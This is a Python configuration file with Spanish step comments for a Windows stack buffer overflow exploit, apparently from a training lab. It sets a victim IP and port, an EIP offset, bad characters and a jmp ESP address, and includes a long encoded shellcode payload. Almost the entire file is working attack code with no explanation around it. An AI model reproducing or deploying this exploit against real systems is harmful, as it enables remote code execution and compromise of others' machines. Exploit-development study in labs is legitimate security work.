# PASO I
# ip máquina victima
rhost = '172.16.5.10'

# puerto máquina victima
rport = 7707

# timeout conexión en segundos
timeout = 10

# PASO II
# pattern
pattern = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac'

# PASO III
# offset EIP
offsetEIP = 44

# offset ESP
offsetESP = offsetEIP + 4

# tamaño máximo del relleno del padding final
buffer = 500

# PASO IV
badchars = [0x00] # badchars = [0x00, 0x0a, 0x0d]
badcharsSequence = bytes(c for c in range(256) if c not in badchars)

# PASO V
# dirección de la operación jmp ESP
jmpESP = 0x7C86467B # jmpESP = 0x11223344

# PASO VI
# subir ESP en la pila (stack)
upESP = b'\x83\xec\x10'
#upESP = b'\x90' * 16

# shellcode
shellcode =  b""
shellcode += b"\xbe\xc0\x9d\xc9\x86\xda\xde\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x31\x73\x12\x03\x73\x12"
shellcode += b"\x83\x03\x99\x2b\x73\x7f\x4a\x29\x7c\x7f\x8b"
shellcode += b"\x4e\xf4\x9a\xba\x4e\x62\xef\xed\x7e\xe0\xbd"
shellcode += b"\x01\xf4\xa4\x55\x91\x78\x61\x5a\x12\x36\x57"
shellcode += b"\x55\xa3\x6b\xab\xf4\x27\x76\xf8\xd6\x16\xb9"
shellcode += b"\x0d\x17\x5e\xa4\xfc\x45\x37\xa2\x53\x79\x3c"
shellcode += b"\xfe\x6f\xf2\x0e\xee\xf7\xe7\xc7\x11\xd9\xb6"
shellcode += b"\x5c\x48\xf9\x39\xb0\xe0\xb0\x21\xd5\xcd\x0b"
shellcode += b"\xda\x2d\xb9\x8d\x0a\x7c\x42\x21\x73\xb0\xb1"
shellcode += b"\x3b\xb4\x77\x2a\x4e\xcc\x8b\xd7\x49\x0b\xf1"
shellcode += b"\x03\xdf\x8f\x51\xc7\x47\x6b\x63\x04\x11\xf8"
shellcode += b"\x6f\xe1\x55\xa6\x73\xf4\xba\xdd\x88\x7d\x3d"
shellcode += b"\x31\x19\xc5\x1a\x95\x41\x9d\x03\x8c\x2f\x70"
shellcode += b"\x3b\xce\x8f\x2d\x99\x85\x22\x39\x90\xc4\x2a"
shellcode += b"\x8e\x99\xf6\xaa\x98\xaa\x85\x98\x07\x01\x01"
shellcode += b"\x91\xc0\x8f\xd6\xd6\xfa\x68\x48\x29\x05\x89"
shellcode += b"\x41\xee\x51\xd9\xf9\xc7\xd9\xb2\xf9\xe8\x0f"
shellcode += b"\x14\xa9\x46\xe0\xd5\x19\x27\x50\xbe\x73\xa8"
shellcode += b"\x8f\xde\x7c\x62\xb8\x75\x87\xe5\x6b\x99\x82"
shellcode += b"\x90\x1b\x98\x8c\x5d\xa3\x15\x6a\x0b\x4b\x70"
shellcode += b"\x25\xa4\xf2\xd9\xbd\x55\xfa\xf7\xb8\x56\x70"
shellcode += b"\xf4\x3d\x18\x71\x71\x2d\xcd\x71\xcc\x0f\x58"
shellcode += b"\x8d\xfa\x27\x06\x1c\x61\xb7\x41\x3d\x3e\xe0"
shellcode += b"\x06\xf3\x37\x64\xbb\xaa\xe1\x9a\x46\x2a\xc9"
shellcode += b"\x1e\x9d\x8f\xd4\x9f\x50\xab\xf2\x8f\xac\x34"
shellcode += b"\xbf\xfb\x60\x63\x69\x55\xc7\xdd\xdb\x0f\x91"
shellcode += b"\xb2\xb5\xc7\x64\xf9\x05\x91\x68\xd4\xf3\x7d"
shellcode += b"\xd8\x81\x45\x82\xd5\x45\x42\xfb\x0b\xf6\xad"
shellcode += b"\xd6\x8f\x16\x4c\xf2\xe5\xbe\xc9\x97\x47\xa3"
shellcode += b"\xe9\x42\x8b\xda\x69\x66\x74\x19\x71\x03\x71"
shellcode += b"\x65\x35\xf8\x0b\xf6\xd0\xfe\xb8\xf7\xf0"